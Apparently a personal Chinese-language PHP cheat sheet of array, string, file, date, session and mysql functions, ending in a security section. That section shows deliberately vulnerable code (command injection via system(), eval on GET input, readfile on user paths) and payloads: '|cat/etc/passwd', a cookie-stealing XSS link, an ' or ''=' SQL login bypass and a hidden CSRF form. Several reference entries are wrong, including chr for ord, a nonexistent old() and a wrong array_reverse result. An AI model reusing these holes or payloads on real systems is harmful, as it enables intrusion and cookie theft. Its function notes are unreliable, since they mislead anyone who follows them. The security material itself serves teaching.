<?PHP


//isset判斷的是 "變數"

//empty判斷的是 "值"


/*1. 變數值為NULL的時候，isset會把變數當成不存在；但empty不會

2. 變數值為0的時候，isset判斷的是變數，所以回傳true；但是empty會把0當成空值，所以也會回傳true

3. 變數值為空字串的時候，isset判斷的是變數，所以回傳true；empty判斷的是值，所以回傳true
*/
------------------------------------------------------------------------------------
DIRECTORY_SEPARATOR		目錄分隔符號 Windows 「\」Linux 「/」

------------------------------------------------------------------------------------

array 
	
	// 產生一組陣列
	range(最小值,最大值,[遞增值])
	range(0,4,2) //array(0,2)
	
	// 多維陣列宣告值後不能回頭設值
	$a[0]=1;
	$a[1][0]=1;
	$a[1][1]=1;
	$a[0][0]=1;//已設置過[1]陣列 不能回頭設置[0]
	
------------------------------------------------------------------------------------	
	
	// 將陣列值指定給某個變數
	list(變數,變數)
	$x=array(0,1,2)
	list($a,$b)=$x //a=0 b=1
	
------------------------------------------------------------------------------------

	$a = array("Jan" => "1", "Feb" => "2", "Mar" => "3");
	
	// 傳回目前陣列指標指向的元素的值
	current(陣列)
	current($a) //1
	
	// 同current
	pos(陣列)
	
	// 傳回目前陣列指標指向的元素的key
	key(陣列)
	key($a) //Jan
	
	// 陣列指標移至下一個元素
	next(陣列)
	next($a) //Feb
	
	// 陣列指標移至上一個元素
	prev(陣列)
	prev($a) //Jan
	
	// 陣列指標移至第一個元素
	reset(陣列)
	reset($a) //Jan
	
	// 陣列指標移至最後一個元素
	end(陣列)
	end($a) // Mar
	
	// 依序回傳陣列每個元素
	each(陣列)
	list($a,$b)=each($a) // $a=Jan $b=1,$a=Feb $b=2,$a=Mar $b=3
	
------------------------------------------------------------------------------------	
	
	$a = array("Jan" => "1", "Feb" => "2", "Mar" => "3");
	
	// 回傳陣列內所有的key
	array_keys(陣列,[指定值為多少才取出key])
	array_keys($a)//Jan,Feb,Mar
	array_keys($a,"2")//Feb
	
	// 回傳陣列內所有的value
	array_values(陣列)
	array_values($a)//1,2,3
	
	// 陣列內所有的value與key對調
	array_flip(陣列)
	array_flip($a)//("1" => "Jan", "2" => "Feb", "3" => "Mar")
	
	// 反轉陣列
	array_reverse(陣列,[是否保留key])
	array_reverse($a)//("Jan" => "3", "Feb" => "2", "Mar" => "1");
	array_reverse($a,true)//("Mar" => "3","Feb" => "2","Jan" => "1");
	
	// 合併陣列，如合併有相同'字串'key則會覆蓋，int key則不會，
	array_merge(陣列,陣列)
	array_merge($a,$b)
	
	// 合併陣列，不會覆蓋相同'字串'key
	array_merge_recursive(陣列,陣列)
	array_merge_recursive($a,$b)
	
	array()+array()//有相同key會覆蓋掉後方陣列  
	
	// 取陣列某元素
	array_slice(陣列,開始位址,[數量])
	array_slice($a,1,1)//2
	
	// 移除陣列某元素
	array_splice(陣列,開始位址,[數量],[取代為某陣列])
	$b=array_splice($a,1,1)//$a=array("Jan" => "1", "Mar" => "3")  $b="Feb" => "2"
	$b=array_splice($a,1,1,array("x"))//$a=array("Jan" => "1","0" => "x", "Mar" => "3")  $b="Feb" => "2"
	
	// 變數轉陣列
	compact(變數,變數...)
	compact($a,$b,$c)
	
------------------------------------------------------------------------------------	
	
	// 排序陣列，由小到大，指定新的數字key
	sort(陣列) 
	// 排序陣列，由小到大，保留key
	asort(陣列)  
	// 排序陣列，由大到小，指定新的數字key
	rsort(陣列)  
	// 排序陣列，由大到小，保留key
	arsort(陣列)  
	// 使用key排序陣列，由小到大
	ksort(陣列)  
	// 使用key排序陣列，由大到小
	krsort(陣列)  
	// 使用key排序陣列，自定排序函數
	uksort(陣列)  
	// 使用value排序陣列，自定排序函數
	uasort(陣列)  
	
------------------------------------------------------------------------------------
	
	// 將元素加入至陣列尾端
	array_push(陣列,加入陣列...)
	
	// 將元素加入至陣列開頭
	array_unshift(陣列,加入陣列...)
	
	// 從陣列尾端取出元素
	array_pop(陣列)
	
	// 從陣列開頭取出元素
	array_shift(陣列)
	
	// 陣列長度
	count(陣列)
	
	// 多維陣列長度
	count(陣列, COUNT_RECURSIVE)

------------------------------------------------------------------------------------	
string
	
	// 字串長度
	strlen(字串)
	
	// 字串長度 可編碼
	mb_strlen(字串,[UTF-8])
	
	// 回傳ASCII碼的字元
	chr(ASCII碼)
	
	// 回傳字元的ASCII碼
	chr(字元)
	
	// 比較兩個字串 區分大小寫 是二進制 較安全
	strcmp(字串,字串) 
	
------------------------------------------------------------------------------------
	
	// 英文字母改成大寫
	strtoupper(英文字串)
	strtoupper("welcome to Taiwan!")//WELCOME TO TAIWAN!
	
	// 英文字母改成小寫
	strtolower(英文字串)
	strtolower("welcome to Taiwan!")//welcome to taiwan!
	
	// 字串第一個字母改成大寫
	ucfirst(英文字串)
	ucfirst("welcome to Taiwan!")//Welcome to Taiwan!

	// 字串每個單字 第一個字母改成大寫
	ucwords(英文字串)
	ucwords("welcome to Taiwan!")//Welcome To Taiwan!
	
	// 英文字母改成大寫 可編碼
	strtoupper(英文字串,[UTF-8])
	strtoupper("welcome to Taiwan!")
	
	// 英文字母改成小寫
	strtolower(英文字串,[UTF-8])
	strtolower("welcome to Taiwan!")
	
------------------------------------------------------------------------------------	
	
	// 搜尋第一個符合的字串 大小寫不同 並決定要回傳該字串前/後的字串 
	strstr(字串,搜尋字串,[true/false])
	
	// 搜尋第一個符合的字串 決定要回傳該字串前/後的字串
	stristr(字串,搜尋字串,[true/false])
	
	/*同strstr
	strchr
	
	搜尋最後一個符合的字串 大小寫不同 */
	strrchr(字串,搜尋字串)
	
	// 搜尋第一個符合的字串的位值 大小寫不同 
	strpos(字串,搜尋字串,[開始位置])
	
	// 搜尋第一個符合的字串的位值 
	stripos(字串,搜尋字串,[開始位置])
	
	// 搜尋最後一個符合的字串的位值 大小寫不同 
	strrpos(字串,搜尋字串,[開始位置])
	
	// 搜尋最後一個符合的字串的位值 
	strripos(字串,搜尋字串,[開始位置])
	
	// 傳回符合字串的數量
	substr_count(字串,搜尋字串,開始位置,開始位置後搜尋的長度)
	//開始位置後搜尋的長度+開始位置 不可大於字串本身長度
	
------------------------------------------------------------------------------------	
	
	// 刪除字串頭尾的空白
	trim(字串,[指定刪除的空白或字元])
	
	// 刪除字串開頭的空白
	ltrim(字串,[指定刪除的空白或字元])
	
	// 刪除字串尾端的空白
	rtrim(字串,[指定刪除的空白或字元])
	
	/*同rtrim
	chop*/
	
------------------------------------------------------------------------------------

	// 反轉字串
	strrev(字串)
	
	// 取代字串中的子字串
	substr_replace(字串,取代字串,開始位址,[長度])
	
	// 取代指定的子字串
	str_replace(字串/陣列,要取代的子字串,取代的字串,[回傳取代數量，用變數接])
	
	// 回傳部分子字串
	substr(字串,開始位址,[長度])
	
	// 回傳重複字串
	str_repeat(字串,重複次數)

	//回傳字符中首個字的ASCII值
	old(String);

	//轉二進位
	decbin(number)

	//補字元/字串/數字
	str_pad(string,length,pad_string,STR_PAD_BOTH|STR_PAD_LEFT|STR_PAD_RIGHT )

	//將HTML轉成字串
	html_entity_decode(HTML)
	
------------------------------------------------------------------------------------	
	// 字串連結
	implode(連結的字串,陣列)
	
	// 字串分割成陣列
	explode(指定分割的子字串,要分割的字串,回傳的數量)
	$str = 'one,two,three,four';
	explode(',',$str,0)//Array ( [0] => one,two,three,four ) 
	explode(',',$str,2)//Array ( [0] => one [1] => two,three,four ) 
	
	// 字串分割成子字串
	strtok(字串,分割的字串)
	
	// 刪除字串中的PHP與HTML tab
	strip_tags(字串,[要保留的tab])
	
------------------------------------------------------------------------------------

	// 自動將脫逸字元加上\
	addcslashes(字串)
	
	// 刪除脫逸字元中的\
	stripcslashes(字串)
	
------------------------------------------------------------------------------------
 hasu
	
	// 傳回字串的md5雜湊值 常用於加密 
	md5(字串,[true/false(二進位)])
	// 傳回字串的sha1雜湊值
	sha1(字串,[true/false(二進位)])
	// 傳回字串的crc雜湊值 常用於檢查資料完整性
 	crc(字串)
	
------------------------------------------------------------------------------------	
function
	
	// 回傳呼叫函數給予的參數數量
	func_num_args()
	function(){//回傳呼叫該函數的參數數量
		echo func_num_args()
	}
	
	// 回傳呼叫函數第幾個參數
	func_get_arg([第幾個參數]) 
	
	// 回傳呼叫函數的參數陣列
	func_get_args() 
	
	// 呼叫自訂函數
	call_user_func (函數,要給的參數)
	
	// 檢查函數是否存在
	function_exists(函數)
	
	// 回傳所有函數的陣列
	get_defined_functions()
	
------------------------------------------------------------------------------------	
object
	
	// 建構子
	__construct//PHP 不會自動呼叫父類建構子 要用parent
	
	/*呼叫父類建構子
	parent::__construct
	
	解構子
	__destruct*/
	
	// class 名稱
	__CLASS__
	
	// 當你new class時會自動呼叫__authload並傳入class名稱
	__autoload(class 名稱)
	function __autoload($class){//new後呼叫__authload傳class名稱 在include
      include_once("path".$class.".php");
	}
	
	// 常數
	const//要使用常數要用 類別名稱::常數名稱
	echo class(變數名稱)::const(常數)
	
	
	static //要讀取static 要用類別名稱::static
	// class外讀取static
	echo class(變數名稱)::const(常數)
	// class內讀取static
	echo self::const(常數)
	
	// 該class不可繼承
	final class
	
	// 該function不可複寫
	final function
	
	// 回傳物件的class名稱
	get_class(物件)

	// 回傳物件的父類class名稱
	get_parent_class(物件)
	
	// 回傳所有class名稱的陣列
	get_declared_classes()
	
	// 判斷class是否存在
	class_exists(類別)
	
	// 檢查某class是否為物件/class的父類別
	is_subclass_of(物件/class,父類別)
	
	// 回傳class內public變數的值陣列
	get_class_vars(類別)
	
	// 回傳物件內public變數的值陣列
	get_object_vars(物件)
	
	// 判斷某物件內某方法是否存在
	method_exists(物件,方法)
	
	// 傳回物件/class內的方法陣列
	get_class_methods(類別/物件)
	
------------------------------------------------------------------------------------	
file
	
	// 回傳檔案名稱 不含路徑
	basename(檔案路徑,[停在某字串 通常是副檔名])
	basename("/etc/sudoers.d", ".d")//sudoers
	basename("/etc/sudoers.d")//sudoers.d
	
	// 回傳資料夾名稱
	dirname(path)
	
	// 取得檔案路徑資訊陣列 
	pathinfo(file,[PATHINFO_DIRNAME|PATHINFO_BASENAME|PATHINFO_EXTENSION|PATHINFO_FILENAME])
	PATHINFO_DIRNAME	資料夾名稱
	PATHINFO_BASENAME	檔名 不含路徑
	PATHINFO_EXTENSION	副檔名
	PATHINFO_FILENAME	檔名 不含路徑 副檔名
	
	// 取得檔案完整路徑 能解析/./，/../
	realpath(path)
	
	// 開啟檔案
	fopen([url,path],[mode])
	// mode參考官網
	
	// 關閉檔案
	fclose(fopen的變數)
	
	// 檢查檔案/資料夾是否存在
	file_exists([url,path])
	
	// 取得檔案大小
	filesize([url,path])
	
	// 以二進位模式讀取檔案
	fread(file,[讀取長度])
	
	// 檢查檔案指標是否在尾端
	feof(file)
	
	// 檢查檔案是否可讀取
	is_readable(file)
	
	// 讀取一行檔案 可指定長度 不指定就讀取到該行結束
	fgets(file[,length])
	
	// 同fgets但可指定要過濾的HTML標籤
	fgetss(file[,length[,tab]])
	
	// 讀取整個檔案到陣列
	file(file,[FILE_USE_INCLUDE_PATH
			  |FILE_IGNORE_NEW_LINES
			  |FILE_SKIP_EMPTY_LINES
			  |FILE_TEXT
			  |FILE_BINARY])
	
	FILE_USE_INCLUDE_PATH	使用PHP.ini內include_path的路徑搜尋檔案
	FILE_IGNORE_NEW_LINES	不在陣列元素上加/n
	FILE_SKIP_EMPTY_LINES	跳過空白字元
	FILE_TEXT				UTF-8
	FILE_BINARY				二進位(預設)
	
	
	// 讀取整個檔案到字串
	file_get_contents(file[,同file flags[,context[,開始讀取位置[,長度]]]])
	
	// 將字串寫到檔案
	file_put_contents(filename,data,mode);
	
	// 讀取檔案到緩衝區 true/false是否使用PHP.ini內include_path的路徑搜尋檔案
	readfile(file[,true/false])
	
	// 輸出剩餘的資料
	fpassthru(file)
	
	// 以二進制模式寫入檔案
	fwrite(file,string[,length])
	
	// check檔案是否可寫入
	is_writable(file)
	
	// 複製檔案
	copy(file,file_bk)
	
	// 刪除檔案
	unlink(file)
	
	// 重新命名
	rename(old_file,new_file)
	
	// 建立資料夾 
	mkdir(path
		 [,mode(Linux權限設置 Window 沒用)
		 [,true(建置巢狀資料夾)]])
	
	// 刪除資料夾
	rmdir(path)
	
	// 取得檔案型態
	filetype(file)
	
	
	
	/*is_dir			檢查是否為資料夾
	is_file			檢查是否為檔案
	is_link			檢查是否為符號連結
	is_executable	檢查是否可執行
	chgrp			更改檔案群組
	chmod			更改檔案模式
	chown			更改檔案擁有者
	clearstatcache	清除檔案的狀態快取
	disk_free_space	回傳資料夾可用的空間
	fileatime		取得檔案最近存取時間
	filectime		取得檔案更改時間
	filegroup		取得檔案群組
	fileowner		取得檔案擁有者
	fileinode		取得檔案inode
	fileperms		取得檔案權限		
	flock			鎖住檔案
	fseek			移動檔案指標
	ftell			回傳檔案指標所在位置
	link			建立hard link
	linkinfo		回傳連結資訊	
	pclose			關閉procrss的檔案指標
	popen			開啟procrss的檔案指標
	readlink		回傳符號連結的目標
	rewind			設定檔案指標至開頭
	stat			取的檔案資訊
	lstat			取得檔案/符號連結的資訊
	fstat			取得已開啟檔案資訊
	symlink			建立符號連結
	touch			設定檔案存取與更改時間
	umask			更改目前umask*/
	
------------------------------------------------------------------------------------
network
	
	/*openlog			開啟系統日誌
	syslog			產生系統登入訊息
	closelog		關閉系統日誌
	checkdnsrr		檢查主機名稱或ip位置的DNS紀錄
	gethostbyaddr
	gethostbyname
	gethostbynamel
	getmxrr
	fsockopen
	getservbyname
	getservbyport
	pfsockopen*/
	
------------------------------------------------------------------------------------
	
	// 引入檔案 失敗則發出警告
	include 
	
	// 引入檔案 失敗則發出錯誤
	require 
	
------------------------------------------------------------------------------------
data
	
	// 設定預設時區
	date_default_timezone_set(時區)
	
	// 取得預設時區
	date_default_timezone_get()
	
	// 回傳目前時間戳記
	time()
	
	傳回目前時間戳記(微秒) 傳回msec、sec兩種字串
	microtime([true/false是否顯示浮點數])//0.08290500 1475314578
	
	// 回傳指定時間的時間戳記
	mktime(參考官網date()格式)
	
	// 回傳指定時間GMT的時間戳記  如台灣是GMT+8 早8小時 所以time為該時區的時間戳記
	gmmktime(參考官網date()格式)
	
	// 格式化時間 有預設時間常數 參考官網date()
	date(參考官網date()格式[,指定時間戳記])
	
	// 同date但回傳的是GMT
	gmdate()
	
	// 回傳一個時間的陣列 有sec、usec2等 參考官網gettimeofday
	gettimeofday()

	// 取得目前時區時間 回傳一個時間的陣列 
	localtime(參考官網localtime)

	// 取得時間的資訊
	getdate(參考官網getdate)
	
	// 將英文日期/時間解析成時間戳記
	strtotime(參考官網strtotime)
	$date = getdate(strtotime($row['birthday']));

	// 設定區域的資訊 參考官網setlocale
	setlocale

	// 檢查是否為有效日期
	checkdate(month,day,year)

	//返回文件內容上次的修改時間 時間戳記
	filemtime(filename)

	strftime
	gmstrftime

------------------------------------------------------------------------------------	
日歷
	
	/*cal_days_in_month	回傳指定日歷與年份 每個月的天數		
	cal_info			回傳指定日曆的資訊
	JDDayOfWeeK			傳回星期幾
	JDMonthName			傳回月份*/
	
------------------------------------------------------------------------------------
數學
	
	// 回傳最大值
	max(array/value,value...)
	
	// 回傳最小值
	min(array/value,value...)
	
	// 亂數
	rand([min[,max]])

	// 取得rand最大值
	getrandmax()

------------------------------------------------------------------------------------
除錯

	try 
{
    throw new Exception("密碼不可以是空白!", 30);
} catch (Exception $e) {
    echo "例外的訊息字串 : " . $e->getMessage() . "<br />";
 	echo "產生例外的檔案 : " . $e->getFile() . "<br />";
 	echo "產生例外的行號 : " . $e->getLine() . "<br />";
 	echo "產生例外的程式碼 : " . $e->getCode() . "<br />";
 	echo "例外的堆疊追蹤陣列 : ";
	print_r($e->getTrace());
	echo "<br />";
 	echo "例外的堆疊追蹤字串 : " . $e->getTraceAsString() . "<br />";
 	echo "例外的表示字串 : " . $e->__toString();
}

	// 設定那些層級要報告
	error_reporting([參考error_reporting level])

	// 產生錯誤訊息
	trigger_error(自訂錯誤訊息[,錯誤層級 只能是E_USER])

	// 設定一個自訂錯誤的處理
	set_error_handler(function)
	function 有以下參數
	$errno	 預設錯誤常數 必要
	$errstr	 錯誤訊息	  必要
	$errfile 錯誤的檔案
	$errline 錯誤行

	// 將錯誤訊息傳送到某處
	error_log(參考官網error_log)
	

	restore_error_handler()

	// 輸出訊息並結束程式執行 參考官網exit
	exit(字串/0~255) 

------------------------------------------------------------------------------------
網頁處理

	// 取得網頁表頭 檔案路徑 server環境 ip等資訊
	$_SERVER[常數]//參考官網$_SERVER
	$_SERVER['PHP_SELF'] #當前正在執行腳本的文件名，與 document root相關。
	$_SERVER['argv'] #傳遞給該腳本的參數。 
	$_SERVER['argc'] #包含傳遞給程序的命令行參數的個數（如果運行在命令行模式）。 
	$_SERVER['GATEWAY_INTERFACE'] #服務器使用的 CGI 規範的版本。例如，「CGI/1.1」。
	$_SERVER['SERVER_NAME'] #當前運行腳本所在服務器主機的名稱。 
	$_SERVER['SERVER_SOFTWARE'] #服務器標識的字串，在響應請求時的頭部中給出。 
	$_SERVER['SERVER_PROTOCOL'] #請求頁面時通信協議的名稱和版本。例如，「HTTP/1.0」。 
	$_SERVER['REQUEST_METHOD'] #訪問頁面時的請求方法。例如：「GET」、「HEAD」，「POST」，「PUT」。 
	$_SERVER['QUERY_STRING'] #查詢(query)的字符串。 
	$_SERVER['DOCUMENT_ROOT'] #當前運行腳本所在的文檔根目錄。在服務器配置文件中定義。
	$_SERVER['HTTP_ACCEPT'] #當前請求的 Accept: 頭部的內容。 
	$_SERVER['HTTP_ACCEPT_CHARSET'] #當前請求的 Accept-Charset: 頭部的內容。例如：「iso-8859-1,*,utf-8」。
	$_SERVER['HTTP_ACCEPT_ENCODING'] #當前請求的 Accept-Encoding: 頭部的內容。例如：「gzip」。
	$_SERVER['HTTP_ACCEPT_LANGUAGE']#當前請求的 Accept-Language: 頭部的內容。例如：「en」。
	$_SERVER['HTTP_CONNECTION'] #當前請求的 Connection: 頭部的內容。例如：「Keep-Alive」。 
	$_SERVER['HTTP_HOST'] #當前請求的 Host: 頭部的內容。 
	$_SERVER['HTTP_REFERER'] #鏈接到當前頁面的前一頁面的 URL 地址。 
	$_SERVER['HTTP_USER_AGENT'] #當前請求的 User_Agent: 頭部的內容。 
	$_SERVER['REMOTE_ADDR'] #正在瀏覽當前頁面用戶的 IP 地址。 
	$_SERVER['REMOTE_HOST'] #正在瀏覽當前頁面用戶的主機名。 
	$_SERVER['REMOTE_PORT'] #用戶連接到服務器時所使用的端口。 
	$_SERVER['SCRIPT_FILENAME'] #當前執行腳本的絕對路徑名。 
	$_SERVER['SERVER_ADMIN'] #管理員信息 
	$_SERVER['SERVER_PORT'] #服務器所使用的端口 
	$_SERVER['SERVER_SIGNATURE'] #包含服務器版本和虛擬主機名的字符串。 
	$_SERVER['PATH_TRANSLATED'] #當前腳本所在文件系統（不是文檔根目錄）的基本路徑。 
	$_SERVER['SCRIPT_NAME'] #包含當前腳本的路徑。這在頁面需要指向自己時非常有用。 
	$_SERVER['REQUEST_URI'] #訪問此頁面所需的 URI。例如，「/index.html」。 
	$_SERVER['PHP_AUTH_USER'] #當 PHP 運行在 Apache 模塊方式下，並且正在使用 HTTP 認證功能，這個變量便是用戶輸入的用戶名。 
	$_SERVER['PHP_AUTH_PW'] #當 PHP 運行在 Apache 模塊方式下，並且正在使用 HTTP 認證功能，這個變量便是用戶輸入的密碼。 
	$_SERVER['AUTH_TYPE'] #當 PHP 運行在 Apache 模塊方式下，並且正在使用 HTTP 認證功能，這個變量便是認證的類型。

	// 開啟輸出緩衝區
	ob_start(function)

	// 傳送輸出緩衝區的內容給瀏覽器
	ob_flush()
	
	// 傳送輸出緩衝區的內容給瀏覽器並關閉緩衝區
	ob_end_flush()

	// 傳送輸出緩衝區的內容給瀏覽器並關閉緩衝區 回傳還緩衝區字串
	ob_get_flush()

	// 清除緩衝區內容
	ob_clean()

	// 清除緩衝區內容並關閉緩衝區
	ob_end_clean()
	
	// 回傳緩衝區內容
	ob_get_contents()
	
	// 回傳緩衝區內容長度
	ob_get_length()
	
------------------------------------------------------------------------------------
Cookie	
	
	setcookie(name
			 [,value
			 [,儲存的時效 時間戳記
			 [,可存取cookie的路徑
			 [,可存取cookie的網域
			 [,true則是只能經HTTPS連線傳送
			 [,true則只能經HTTP傳送不能使用script存取]]]]]])
	
	// 存取cookie
	$_COOKIE[cookie_name]
	
------------------------------------------------------------------------------------	
session
	
	// 取得session
	$_SESSION[變數]
	
	// 建立session
	session_start()
	
	/*空參數 輸出session id
	可設定session id 但需在session_start前*/
	session_id([id])
	
	/*空參數 輸出session name
	可設定session name 但需在session_start前*/
	session_name([name="PHPSESSID"])
	
	// 刪除一個session
	unset($_SESSION[變數])
	
	// 刪除全部session
	session_unset()
	
------------------------------------------------------------------------------------	
header
	
	// 送出HTTP表頭
	header(表頭[,true會取代現在的表頭不然就增加])
	// 轉到其他網址
	header(Location:URL)
	// 指定輸出網頁的MIME
	header(Context-Type:image/jpeg)
	// 下載檔案
	header(Context-Disposition:參考官網)
	// 定時刷新
	header(Refresh:5)
	
------------------------------------------------------------------------------------	
mysql

	// mysql連線
	mysql_connect([server name
				  [,username
				  [,password
				  [,true 則是建立一個新連線
				  [,參考官網]]]]])
	
	// 關閉mysql
	mysql_close(mysql)
	
	// 同mysql_connect 但PHP結束後不會關閉 用mysql_close也無效
	mysql_pconnect()
	
	// 回傳上一個mysql錯誤號碼	沒錯誤則為0
	mysql_errno()
	
	// 回傳上一個mysql錯誤訊息	沒錯誤則為空字串
	mysql_error()
	
	// 設定用戶端的字元集
	mysql_set_charset(utf8[,mysql])
	
	// 選擇資料庫
	mysql_select_db(database[,mysql])
	
	// 執行sql
	mysql_query(sql[,mysql])
	
	// 資料筆數 適用在show select 
	mysql_num_rows(result)
	
	// 回傳被影響的筆數 適用在insert update replace delete
	mysql_affected_rows([result])
	
	// 釋放執行SQL後的result
	mysql_free_result(result)
	
	// 回傳一個結果陣列 key只能是數字從0開始
	mysql_fetch_row(result)
	
	// 回傳一個結果陣列 key只能是字串
	mysql_fetch_assoc(result)
	
	// 回傳一個結果陣列 key可能是數字或字串
	mysql_fetch_array(result[,MYSQL_ASSOC|MYSQL_NUM|MYSQL_BOTH])
	MYSQL_ASSOC:	同mysql_fetch_assoc
	MYSQL_NUM:		同mysql_fetch_row
	MYSQL_BOTH:		同mysql_fetch_array 不加第二參數
	
	// 以物件回傳結果
	mysql_fetch_object(result[,要建立的class name[,物件參數]])
	
	
	// 回傳結果 可指定位置
	mysql_result(result[,位置[,欄位名/偏移值]])
	
	
	/*mysql_create_db		建立mysql資料庫
	mysql_data_seek		移動內部結果的指標
	mysql_drop_db		刪除一個mysql資料庫
	mysql_fetch_field	取得結果的欄位資訊	以物件回傳
	mysql_fetch_lengths	取得結果的每個輸出長度
	mysql_field_name	取得結果指定欄位的長度
	mysql_field_seek	設定指定欄位偏移值的結果指標
	mysql_field_table	取得欄位所在的資料表名稱
	mysql_field_type	取得一個結果指定的資料型態
	mysql_field_flags	
	mysql_field_len		回傳指定欄位的長度
	mysql_insert_id		取得上一個查詢所產生的id
	mysql_list_fields	列出mysql資料表的欄位
	mysql_list_dbs		列出mysql上可取得的資料庫
	mysql_list_tables	列出mysql資料庫內的資料表
	mysql_num_fields	取得結果欄位數目
	mysql_tablename		取得欄位的資料表名稱*/
	
------------------------------------------------------------------------------------
PDO

	
------------------------------------------------------------------------------------	
php 安全

1.
/*如果php.ini register_globals設on 變數值沒有設初始值可直接使用http請求網址下變數值
可直接使用http請求網址下變數值 這樣可以直接從網址給值，如果為off就能確認值
只會從php內部來而非透過網值給值
 	*/
2.
safe_mode

3.
magic quotes

4.
/*命令植入攻擊，因php可能需要執行外部應用程式來輔助功能
駭客可透過.php?dir=|cat/etc/passwd 來對system下指令
$dir = $_GET["dir"];*/

if (isset($dir)) {
	echo "<pre>";
	system("ls -al " . $dir);
	echo "</pre>";
}

5.
/*eval植入攻擊
當駭客可掌握eval時，利用.php?agr=system("dir c:")
執行system*/
$myvar = "varname";

if (isset($_GET["arg"])) {
	$arg = $_GET["arg"];
	eval("\$myvar = $arg;");
	echo "\$myvar = " . $myvar;
}

6.
/*用戶端指令碼植入
最常見在於留言板，如留言時下<script>location.href="https://www.google.com.tw";</script>
沒做任何防範就存到資料表內下次瀏覽時利用瀏覽器只要遇到HTML或js就會直接執行的特性
輸出這段js或指令來攻擊，解決方法是利用strip_tags或htmlspecialchars(推薦)*/

7.
xss /*跨網站指令碼攻擊是指發送一個連結給使用者，使用者點擊後透過js傳到其他網站
來竊取cookie，*/
<a href="http://localhost/ex25-5.php?user=
		<script>document.location='http://localhost/ex25-5-1.php?cookie='%2Bdocument.cookie;</script>">
    按我
</a>	
// 點"按我"後傳到ex25-5.php的user後echo執行js傳到ex25-5-1.php內有<?php echo $_GET["cookie"]; ?> 就可取得cookie
<!-- 防範一樣是使用htmlspecialchars -->
<!-- 關閉chrome加入header("X-XSS-Protection: 0") -->
	
8.
SQL injection<!-- 透過使用者輸入帳密都是透過$_POST["username"]再加上SQL，如果在密碼上打上特殊程式碼與SQL結合即可不使用帳密登入網頁
$query = "SELECT * FROM member WHERE username='" . $_POST["username"] . "' AND password='" . $_POST["password"] . "'";

username=' or ''='
password=' or ''='

sql會是這樣	SELECT * FROM member WHERE username='' or ''='' AND password='' or ''=''

username = 空 or 空=空 and password=空 or 空=空

因為or 空=空的關係 username=true and password=true 就可無帳密進入網站

防範是對輸入的帳密進行轉換 如字串是addslashes -->

9.
<!-- csrf透過隱藏某段連結，讓使用者點這個連結後去做一些事情 -->
<form action="http://localhost/ex25-7-2.php" method="post" name="form1" id="form1">
  <input type="hidden" name="id" id="id" value="3" />
  <input type="hidden" name="delete" value="1" />
</form>
<!-- 點此連結後到ex25-7-2.php 會接到id與delete，當然這兩個值是駭客自己設的
點到此連結後就會去做刪除的動作，由於是使用者自己點擊的所以很難判斷出是否惡意的
因為刪除是正常的功能，防範是利用md5，建立一個session的id當此id與實際id(也是md5)
一樣時才能做這些動作 PS不是很懂要多找實例 -->

10. 	
Session挾持攻擊<!-- ，當駭客透過某種方法取得使用者的Session id後就可以對其內容進行更改，
因為網站常用Session儲存一些資料，如購物車等
XXX.php?PHPSESSID=qlk7nkjttgm295uf8kfugpgvc0
得到id後可以像這樣進去網站在底下設一些Session把原先資料覆蓋掉
防範方法有定期更改Session id Session_regenerate_id()
更改Session 名稱，因為預設是PHPSESSID 這樣駭客很難透過PHPSESSID=qlk7nkjttgm295uf8kfugpgvc0進去你的Session
關閉Session id透明化 php.ini session.use_trans_sid設0
只從cookie檢查Session id php.ini session.use_cookies設0 session.use_only_cookie 設0
每次開網站隨機設一個session變數然後在每個網頁都檢查session，值都是用md5設的 駭客很難得知session變數值所以
每次檢查都能夠知道此網頁是不是真的使用者在操做  -->

11.
path Traversal <!-- 駭客可透過web來得或操作伺服器底下目錄的資料

如當需使用者輸入檔案時@readfile($_GET["file"]);
如果file輸入特定位止某資料，如log這樣就可以印出log資料
防範是不要使用使用者提供的檔名
檢查檔名內是否有..目錄階層的字元
php.ini  open_basedir指定可以開啟檔案
allow_url_fopen 設為off 不能開啟
使用realpath basename 處理使用者輸入的檔名 -->

------------------------------------------------------------------------------------	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
?>